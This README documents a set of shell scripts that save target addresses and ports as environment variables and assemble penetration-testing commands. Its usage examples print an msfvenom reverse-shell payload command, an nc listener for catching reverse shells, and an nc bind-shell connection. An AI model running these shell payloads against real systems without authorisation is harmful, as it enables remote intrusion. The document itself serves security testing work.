## What is this
This project is a set of shell scripts that expand your shell with exported variables that you set and updates your shell environment instantly.
## Installation
Run as root:
```
# ./install.sh
```
## Usage
### _target
The `_target` script saves IPv4 addresses, or changes IPv4 address if field already exists:
```
$ _target -t 127.0.0.1
```
This version saves another address with number specified by `-n` flag:
```
$ _target -t 173.194.222.106 -n 1
```
### _port
The `_port` works the same as `_target` but saves port values:
```
$ _port -p 1337
```
Also can save more than one port as in `-n` flag:
```
$ _port -p 1338 -n 1
```
**Importnant note**: after executing `_target` or `_port` scripts new variables will be loaded into shell environment.
### _options
The `_options` script parses dotfile and outputs its contents with some additional information in the following pattern:
- available network interfaces/your localhost's corresponding IPv4 addresses/network's gateway IPv4 addresses
- saved target addresses/their status: ONLINE/OFFLINE
- saved port values
```
~$ _options
Localhost interfaces:
    interface: enp3s0
      enp3s0_ip: 10.0.1.3
       enp3s0_g: 10.0.1.1
    interface: tun0
        tun0_ip: 10.8.111.27
         tun0_g: 10.8.111.1
Target variables:
    name: target1    value: 173.194.222.106 host status: ONLINE
    name: target     value: 127.0.0.1       host status: ONLINE
Port variables:
    name: port       value: 1337
    name: port1      value: 1338
```
### _pentest_assist
The `_pentest_assist` script parses dotfile, substitutes variables' corresponding values, as a result constructing commands specified with `-m` (mode) flag:
```
$ _pentest_assist -m useful-payloads -i tun0
   ┌ Reverse shell payload for buffer overflow
1. msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.8.111.27 LPORT=1337 --platform linux --arch x86 --format c
State your choice: 1
```
Or:
```
$ _pentest_assist -m nc
   ┌ Catch reverse shell from exploited target:
1. nc -nlvp 1337
   ┌ Connect to bind shell on the exloited target:
2. nc 127.0.0.1 1337
State your choice: 2
```
